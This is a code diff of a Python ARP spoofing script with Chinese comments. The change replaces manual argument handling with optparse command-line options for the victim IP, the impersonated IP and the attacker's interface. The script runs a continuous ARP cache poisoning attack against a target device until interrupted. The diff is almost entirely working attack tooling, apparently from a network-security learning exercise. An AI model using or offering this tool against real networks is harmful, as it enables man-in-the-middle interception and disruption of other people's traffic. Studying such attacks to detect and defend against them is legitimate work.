@@ -19,8 +19,9 @@ from GET_MAC import get_mac_address #导入获取本机MAC地址方法
 from ARP_def import get_arp #导入之前创建的ARP请求脚本
 import time
 import signal
+import optparse
 
-def arp_spoof(ip_1, ip_2, ifname = 'eno33554944'):
+def arp_spoof(ip_1, ip_2, ifname):
 	global localip,localmac,ip_1_mac,ip_2_mac,g_ip_1,g_ip_2,g_ifname #申明全局变量
 	g_ip_1 = ip_1 #为全局变量赋值，g_ip_1为被毒化ARP设备的IP地址
 	g_ip_2 = ip_2 #为全局变量赋值，g_ip_2为本机伪装设备的IP地址
@@ -31,9 +32,9 @@ def arp_spoof(ip_1, ip_2, ifname = 'eno33554944'):
 	#获取本机MAC地址，并且赋值到全局变量localmac
 	localmac = get_mac_address(ifname)
 	#获取ip_1的真实MAC地址
-	ip_1_mac = get_arp(ip_1)
+	ip_1_mac = get_arp(ip_1,ifname)
 	#获取ip_2的真实MAC地址
-	ip_2_mac = get_arp(ip_2)
+	ip_2_mac = get_arp(ip_2,ifname)
 	#引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
 	signal.signal(signal.SIGINT,sigint_handler)
 	while True:#一直攻击，直到ctl+c出现！！！
@@ -57,18 +58,16 @@ def sigint_handler(signum,frame): #定义处理方法
 	sys.exit()
 
 if __name__ == "__main__":
-	import sys
-	if len(sys.argv) > 2:#./ARP_poison.py 202.100.1.1 202.100.1.2 xxxxxxx
-		IPADDR_1 = sys.argv[1]#第一个参数为被毒化设备
-		IPADDR_2 = sys.argv[2]#第二个参数为本机伪装的设备
-		if len(sys.argv) > 3:#./ARP_poison.py 202.100.1.1 202.100.1.2 eno33554944 xxxxx
-			IPADDR_1 = sys.argv[1]#第一个参数为被毒化设备
-			IPADDR_2 = sys.argv[2]#第二个参数为本机伪装的设备
-			INTERFACE = sys.argv[3]#第三个参数为攻击接口的名字
-	else:
-		print("参数错误")
+	parser = optparse.OptionParser('用法：\n python3 ARP_Spoof.py --ip1 被欺骗设备 --ip2 真实目的IP --ifname 攻击者的MAC对应的接口名')
+	parser.add_option('--ip1', dest = 'ip1', type = 'string', help = '这是被攻击者')
+	parser.add_option('--ip2', dest = 'ip2', type = 'string', help = '这是被攻击者要查询的IP')
+	parser.add_option('--ifname', dest = 'ifname', type = 'string', help = '这是攻击者自己的接口名')
 
-	if len(sys.argv) > 3:
-		arp_spoof(IPADDR_1, IPADDR_2, INTERFACE)
+	(options, args) = parser.parse_args()
+	ip1 = options.ip1
+	ip2 = options.ip2
+	ifname = options.ifname
+	if ip1 == None or ip2 == None or ifname == None:
+		print(parser.usage)
 	else:
-		arp_spoof(IPADDR_1, IPADDR_2)
+		arp_spoof(ip1, ip2, ifname)
